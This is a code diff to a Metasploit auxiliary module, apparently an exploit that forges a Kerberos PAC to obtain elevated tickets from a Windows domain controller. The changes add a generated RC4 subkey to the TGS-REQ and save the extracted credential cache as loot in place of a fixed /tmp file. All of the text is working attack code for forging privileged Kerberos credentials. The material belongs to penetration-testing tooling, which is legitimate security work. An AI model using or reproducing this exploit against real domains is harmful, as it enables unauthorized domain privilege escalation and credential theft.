@@ -8,6 +8,7 @@ require 'rex'
 
 class Metasploit4 < Msf::Auxiliary
 
+  include Msf::Auxiliary::Report
   include Msf::Kerberos::Client
 
   def initialize(info = {})
@@ -51,7 +52,7 @@ class Metasploit4 < Msf::Auxiliary
 
   def run
     print_status("#{peer} - Connecting with the KDC...")
-    connect(:rhost => datastore['RHOST'])
+    connect
 
     unicode_password = Rex::Text.to_unicode(datastore['PASSWORD'])
     password_digest = OpenSSL::Digest.digest('MD4', unicode_password)
@@ -101,6 +102,7 @@ class Metasploit4 < Msf::Auxiliary
     )
 
     auth_data = build_pac_authorization_data(pac: pac)
+    sub_key = build_subkey(subkey_type: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
 
     print_status("#{peer} - Sending TGS-REQ...")
 
@@ -111,7 +113,8 @@ class Metasploit4 < Msf::Auxiliary
       session_key: session_key,
       ticket: ticket,
       auth_data: auth_data,
-      pa_data: pre_auth
+      pa_data: pre_auth,
+      subkey: sub_key
     )
 
     unless res.msg_type == Rex::Proto::Kerberos::Model::TGS_REP
@@ -121,11 +124,10 @@ class Metasploit4 < Msf::Auxiliary
 
     print_good("#{peer} - Valid TGS-Response, extracting credentials...")
 
-    cache = extract_kerb_creds(res, 'AAAABBBBCCCCDDDD')
+    cache = extract_kerb_creds(res, sub_key.value)
 
-    f = File.new('/tmp/cache.ticket', 'wb')
-    f.write(cache.encode)
-    f.close
+    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
+    print_good("#{peer} - MIT Credential Cache saved on #{path}")
   end
 end
 
